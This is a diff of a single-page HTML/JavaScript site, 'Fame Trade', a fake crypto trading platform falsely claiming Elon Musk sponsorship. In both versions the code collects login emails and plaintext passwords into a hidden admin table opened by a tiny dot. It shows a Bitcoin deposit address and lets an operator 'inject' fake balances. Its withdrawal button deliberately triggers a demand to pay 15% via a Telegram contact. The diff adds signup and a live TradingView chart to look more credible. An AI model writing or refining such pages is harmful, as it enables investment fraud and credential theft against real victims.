@@ -4,193 +4,208 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Fame Trade | Sponsored by Elon Musk</title>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
     <style>
-        :root { --green: #00c853; --red: #ff3d00; --dark: #0a0a0a; --card: #1a1a1a; --gold: #f3ba2f; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--dark); color: white; margin: 0; overflow-x: hidden; }
+        :root { --green: #00c853; --red: #ff3d00; --dark: #0a0a0a; --card: #141414; --gold: #f3ba2f; }
+        body { font-family: -apple-system, sans-serif; background: var(--dark); color: white; margin: 0; }
         .hidden { display: none !important; }
-        
-        /* Layout */
-        .page { min-height: 100vh; padding: 20px; box-sizing: border-box; }
-        .card { background: var(--card); border-radius: 18px; padding: 20px; border: 1px solid #222; margin-bottom: 20px; }
-        
-        /* Balance Section */
-        .balance-box { text-align: center; background: linear-gradient(180deg, #222, #000); border: 1px solid #333; border-radius: 25px; padding: 30px; margin-bottom: 25px; }
-        .balance-usd { font-size: 3rem; font-weight: 800; margin: 5px 0; }
-        .balance-btc { color: var(--gold); font-size: 1.1rem; font-weight: 500; }
-
-        /* Buttons */
-        .btn-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .btn { padding: 16px; border-radius: 12px; border: none; font-weight: bold; font-size: 1rem; cursor: pointer; text-align: center; }
+        .page { min-height: 100vh; padding: 15px; box-sizing: border-box; }
+        .card { background: var(--card); border-radius: 15px; padding: 15px; border: 1px solid #222; margin-bottom: 15px; }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid #333; background: #222; color: white; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; margin-top: 5px; }
         .btn-green { background: var(--green); color: white; }
-        .btn-gray { background: #333; color: white; }
-
-        /* Markets */
-        .market-list { max-height: 300px; overflow-y: auto; }
-        .market-item { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid #222; }
-
+        .balance-usd { font-size: 2.5rem; font-weight: 800; text-align: center; margin: 10px 0; }
+        #chart-container { height: 300px; width: 100%; border-radius: 10px; overflow: hidden; margin: 15px 0; }
+        
         /* Admin Dashboard Styles */
         #admin-dash { background: white; color: black; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 10000; overflow-y: auto; padding: 20px; box-sizing: border-box; }
-        .admin-input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; }
-        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 0.9rem; }
-        th, td { border: 1px solid #ddd; padding: 10px; text-align: left; }
+        table { width: 100%; border-collapse: collapse; font-size: 0.8rem; }
+        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
     </style>
 </head>
 <body>
 
-<div id="login-page" class="page" style="display: flex; flex-direction: column; justify-content: center;">
-    <div class="card" style="text-align: center;">
-        <h1 style="color: var(--gold); margin-bottom: 0;">Fame Trade</h1>
-        <p style="color: #666; margin-top: 5px;">Secure Web Trading</p>
-        <input type="email" id="email-in" class="admin-input" placeholder="Email Address" style="background:#222; color:white; border:1px solid #333;">
-        <input type="password" id="pass-in" class="admin-input" placeholder="Password" style="background:#222; color:white; border:1px solid #333;">
-        <button class="btn btn-green" style="width: 100%;" onclick="doLogin()">Login</button>
+<div id="auth-page" class="page">
+    <div class="card" style="margin-top: 20vh; text-align: center;">
+        <h1 style="color: var(--gold);">Fame Trade</h1>
+        <div id="auth-toggle">
+            <h3 id="auth-title">Login</h3>
+            <input type="email" id="auth-email" placeholder="Email">
+            <input type="password" id="auth-pass" placeholder="Password">
+            <button class="btn btn-green" onclick="handleAuth()">Continue</button>
+            <p onclick="toggleAuthMode()" style="font-size: 0.8rem; color: #888; margin-top: 15px; cursor: pointer;">
+                Don't have an account? <span style="color: var(--gold);">Create Account</span>
+            </p>
+        </div>
     </div>
 </div>
 
 <div id="main-site" class="page hidden">
-    <header style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-        <h2 style="color: var(--gold); margin: 0;">Fame Trade</h2>
-        <span style="background: #222; padding: 5px 12px; border-radius: 20px; font-size: 0.7rem;">PRO ACCOUNT</span>
+    <header style="display: flex; justify-content: space-between; align-items: center;">
+        <h2 style="color: var(--gold);">Fame Trade</h2>
+        <button onclick="logout()" style="background:none; border:none; color:#555;">Logout</button>
     </header>
 
-    <div class="balance-box">
-        <div class="balance-btc" id="btc-val">0.00000000 BTC</div>
-        <div class="balance-usd" id="usd-val">$0.00</div>
-        <div style="color: #555; font-size: 0.7rem; margin-top: 10px; letter-spacing: 2px;">TOTAL EQUITY</div>
-    </div>
-
-    <div class="btn-row">
-        <button class="btn btn-green" onclick="alert('Deposit BTC to: bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm')">Deposit</button>
-        <button class="btn btn-gray" onclick="withdrawTrap()">Withdraw</button>
-    </div>
-
-    <h3 style="margin: 25px 0 10px;">Market Overview</h3>
-    <div class="card market-list" id="market-list">
+    <div class="card" style="text-align: center; background: linear-gradient(180deg, #1a1a1a, #000);">
+        <div style="color: var(--gold);" id="btc-display">0.00000000 BTC</div>
+        <div class="balance-usd" id="usd-display">$0.00</div>
+        <div style="display: flex; gap: 10px;">
+            <button class="btn btn-green" style="flex:1" onclick="alert('BTC Address: bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm')">Deposit</button>
+            <button class="btn" style="flex:1; background:#333; color:white;" onclick="handleWithdraw()">Withdraw</button>
         </div>
+    </div>
 
-    <div class="card" style="font-size: 0.8rem; color: #555; text-align: center;">
-        <p id="user-display">User: --</p>
-        <p>Official Site <b>Sponsored by Elon Musk</b></p>
-        <div onclick="openAdminGate()" style="width: 20px; height: 20px; margin: auto; cursor: pointer;">.</div>
+    <div id="chart-container"></div>
+
+    <h3>Live Markets</h3>
+    <div class="card" id="market-list" style="height: 200px; overflow-y: auto;"></div>
+
+    <div class="card" style="font-size: 0.7rem; color: #444; text-align: center;">
+        <p id="user-info"></p>
+        <p>Sponsored by Elon Musk</p>
+        <div onclick="document.getElementById('admin-gate').classList.remove('hidden')" style="width: 20px; height: 20px; margin: auto;">.</div>
     </div>
 </div>
 
-<div id="admin-gate" class="hidden" style="position:fixed; top:0; background:rgba(0,0,0,0.95); width:100%; height:100%; z-index:9999; display:flex; align-items:center; justify-content:center; padding:20px; box-sizing:border-box;">
-    <div class="card" style="background:white; color:black; width:100%; max-width:300px;">
-        <h3 style="text-align:center;">Admin Entry</h3>
-        <input type="text" id="adm-u" class="admin-input" placeholder="Admin ID">
-        <input type="password" id="adm-p" class="admin-input" placeholder="Password">
-        <button class="btn btn-green" style="width:100%;" onclick="verifyAdmin()">Enter Dashboard</button>
-        <button onclick="document.getElementById('admin-gate').classList.add('hidden')" style="width:100%; background:none; border:none; color:#888; margin-top:10px;">Close</button>
+<div id="withdraw-page" class="page hidden" style="background: #000; position: fixed; top:0; width: 100%;">
+    <button onclick="closeWithdraw()" style="color: white; background: none; border: none; padding: 20px;">← Back</button>
+    <div class="card">
+        <h3>Select Method</h3>
+        <select id="method">
+            <option>Bitcoin Wallet</option>
+            <option>CashApp ($Tag)</option>
+            <option>Ethereum (ERC20)</option>
+            <option>Bank Wire</option>
+        </select>
+        <input type="text" placeholder="Enter Wallet Address or Tag">
+        <button class="btn btn-green" onclick="triggerTrap()">Submit Withdrawal</button>
     </div>
 </div>
 
 <div id="admin-dash" class="hidden">
-    <div style="display:flex; justify-content:space-between; align-items:center;">
-        <h2>Admin Panel</h2>
-        <button onclick="location.reload()" style="background:red; color:white; border:none; padding:8px 15px; border-radius:5px;">Logout</button>
+    <h2>Admin Console <button onclick="location.reload()" style="float:right; background:red; color:white; border:none; padding:5px;">Exit</button></h2>
+    <div style="background:#eee; padding:15px; border-radius:10px; margin-bottom:20px;">
+        <h4>Inject Funds</h4>
+        <input type="email" id="inj-email" placeholder="User Email" style="color:black; background:white;">
+        <input type="number" id="inj-amt" placeholder="Amount ($)" style="color:black; background:white;">
+        <button class="btn btn-green" onclick="inject()">Inject</button>
     </div>
-
-    <div style="background:#f0f0f0; padding:15px; border-radius:10px; margin:20px 0;">
-        <h4>Fund Injector</h4>
-        <input type="email" id="inj-email" class="admin-input" placeholder="User Email">
-        <input type="number" id="inj-amt" class="admin-input" placeholder="Amount ($)">
-        <button class="btn btn-green" style="width:100%;" onclick="injectFunds()">Inject Funds</button>
-    </div>
-
-    <h4>User Database (Logs)</h4>
+    <h4>User Logs</h4>
     <table id="log-table">
-        <thead><tr><th>Email</th><th>Password</th><th>Status</th><th>Action</th></tr></thead>
+        <thead><tr><th>Email</th><th>Password</th><th>Status</th></tr></thead>
         <tbody></tbody>
     </table>
 </div>
 
-<script>
-    let users = JSON.parse(localStorage.getItem('ft_users')) || [];
-    let frozen = JSON.parse(localStorage.getItem('ft_frozen')) || [];
-    let currentBalance = 0;
-    let currentUser = "";
+<div id="admin-gate" class="hidden" style="position:fixed; top:0; background:rgba(0,0,0,0.9); width:100%; height:100%; z-index:9999; display:flex; align-items:center; justify-content:center;">
+    <div class="card" style="background:white; color:black; width:80%;">
+        <h3>Admin ID</h3>
+        <input type="text" id="adm-u" placeholder="ID">
+        <input type="password" id="adm-p" placeholder="Password">
+        <button class="btn btn-green" onclick="verifyAdmin()">Login</button>
+    </div>
+</div>
 
-    function doLogin() {
-        const e = document.getElementById('email-in').value;
-        const p = document.getElementById('pass-in').value;
+<script>
+    let isSignup = false;
+    let users = JSON.parse(localStorage.getItem('ft_users')) || [];
+    let loggedUser = JSON.parse(localStorage.getItem('ft_session')) || null;
+    let balance = 0;
+
+    function toggleAuthMode() {
+        isSignup = !isSignup;
+        document.getElementById('auth-title').innerText = isSignup ? "Create Account" : "Login";
+    }
+
+    function handleAuth() {
+        const e = document.getElementById('auth-email').value;
+        const p = document.getElementById('auth-pass').value;
         if(e && p) {
-            currentUser = e;
-            users.push({email: e, pass: p});
+            if(isSignup) users.push({email: e, pass: p});
             localStorage.setItem('ft_users', JSON.stringify(users));
-            document.getElementById('login-page').classList.add('hidden');
-            document.getElementById('main-site').classList.remove('hidden');
-            document.getElementById('user-display').innerText = "Account: " + e;
-            genMarkets();
-        } else { alert("Please enter credentials"); }
+            localStorage.setItem('ft_session', JSON.stringify({email: e}));
+            location.reload();
+        }
+    }
+
+    function logout() {
+        localStorage.removeItem('ft_session');
+        location.reload();
+    }
+
+    // Load Session
+    if(loggedUser) {
+        document.getElementById('auth-page').classList.add('hidden');
+        document.getElementById('main-site').classList.remove('hidden');
+        document.getElementById('user-info').innerText = "Logged in as: " + loggedUser.email;
+        initChart();
+        genMarkets();
+    }
+
+    function initChart() {
+        new TradingView.widget({
+            "container_id": "chart-container",
+            "autosize": true,
+            "symbol": "BINANCE:BTCUSDT",
+            "interval": "D",
+            "timezone": "Etc/UTC",
+            "theme": "dark",
+            "style": "1",
+            "locale": "en",
+            "toolbar_bg": "#f1f3f6",
+            "enable_publishing": false,
+            "hide_top_toolbar": true,
+            "save_image": false
+        });
     }
 
     function genMarkets() {
         const list = document.getElementById('market-list');
-        const assets = ["BTC", "ETH", "SOL", "BNB", "XRP", "ADA", "DOGE", "TRX", "DOT", "MATIC", "LTC", "SHIB", "AVAX", "LINK", "UNI", "ATOM", "TON", "BCH", "ETC", "XLM"];
-        list.innerHTML = "";
-        assets.forEach(a => {
-            list.innerHTML += `<div class="market-item">
-                <div><b>${a}/USD</b></div>
-                <div style="color:var(--green)">$${(Math.random()*1000).toFixed(2)}</div>
-                <button class="btn-green" style="padding:5px 10px; border:none; border-radius:5px;" onclick="tradeCheck()">Buy</button>
+        const coins = ["BTC", "ETH", "SOL", "BNB", "XRP", "ADA", "DOGE", "TRX", "DOT", "MATIC"];
+        coins.forEach(c => {
+            list.innerHTML += `<div style="display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #222;">
+                <b>${c}/USD</b> <button style="background:var(--green); border:none; color:white; border-radius:4px;" onclick="trade()">Trade</button>
             </div>`;
         });
     }
 
-    function withdrawTrap() {
-        alert("Withdrawal Error:\n\nDear user, contact customer support or pay 15% of your available balance before completing withdrawal.\n\nTelegram: +1 215 620 8677");
-    }
-
-    function tradeCheck() {
-        if(frozen.includes(currentUser)) {
-            alert("Account Restricted: Suspicious activity detected. Contact Support.");
-        } else if(currentBalance <= 0) {
-            alert("Insufficient Funds. Please deposit first.");
+    function handleWithdraw() {
+        if(balance < 500) {
+            alert("Insufficient Funds: Minimum withdrawal is $500. Current balance: $" + balance);
         } else {
-            alert("Trade Successful!");
+            document.getElementById('withdraw-page').classList.remove('hidden');
         }
     }
 
-    // ADMIN LOGIC
-    function openAdminGate() { document.getElementById('admin-gate').classList.remove('hidden'); }
-    
+    function triggerTrap() {
+        alert("Verification Required:\n\nDear user, contact customer support or pay 15% of your available balance before completing withdrawal.\n\nTelegram Support: +1 215 620 8677");
+    }
+
+    function closeWithdraw() { document.getElementById('withdraw-page').classList.add('hidden'); }
+
     function verifyAdmin() {
         if(document.getElementById('adm-u').value === "Admin" && document.getElementById('adm-p').value === "ElonMusk2025") {
             document.getElementById('admin-gate').classList.add('hidden');
             document.getElementById('admin-dash').classList.remove('hidden');
-            refreshLogs();
-        } else { alert("Access Denied"); }
+            const tbody = document.querySelector("#log-table tbody");
+            tbody.innerHTML = "";
+            users.forEach(u => {
+                tbody.innerHTML += `<tr><td>${u.email}</td><td>${u.pass}</td><td>Active</td></tr>`;
+            });
+        }
     }
 
-    function refreshLogs() {
-        const tbody = document.querySelector("#log-table tbody");
-        tbody.innerHTML = "";
-        users.forEach(u => {
-            const isF = frozen.includes(u.email);
-            tbody.innerHTML += `<tr>
-                <td>${u.email}</td>
-                <td>${u.pass}</td>
-                <td style="color:${isF?'red':'green'}">${isF?'Frozen':'Active'}</td>
-                <td><button onclick="toggleF('${u.email}')">${isF?'Unfreeze':'Freeze'}</button></td>
-            </tr>`;
-        });
-    }
-
-    function toggleF(email) {
-        if(frozen.includes(email)) { frozen = frozen.filter(x => x !== email); }
-        else { frozen.push(email); }
-        localStorage.setItem('ft_frozen', JSON.stringify(frozen));
-        refreshLogs();
-    }
-
-    function injectFunds() {
+    function inject() {
         const amt = document.getElementById('inj-amt').value;
-        currentBalance = parseFloat(amt);
-        document.getElementById('usd-val').innerText = "$" + currentBalance.toLocaleString();
-        document.getElementById('btc-val').innerText = (currentBalance/96000).toFixed(8) + " BTC";
-        alert("Funds Injected!");
-        document.getElementById('admin-dash').classList.add('hidden');
+        balance = parseFloat(amt);
+        document.getElementById('usd-display').innerText = "$" + balance.toLocaleString();
+        document.getElementById('btc-display').innerText = (balance / 98000).toFixed(8) + " BTC";
+        alert("Injected successfully!");
+    }
+
+    function trade() {
+        if(balance <= 0) alert("Deposit funds to trade live markets.");
+        else alert("Order Executed with Injected Funds!");
     }
 </script>
 </body>
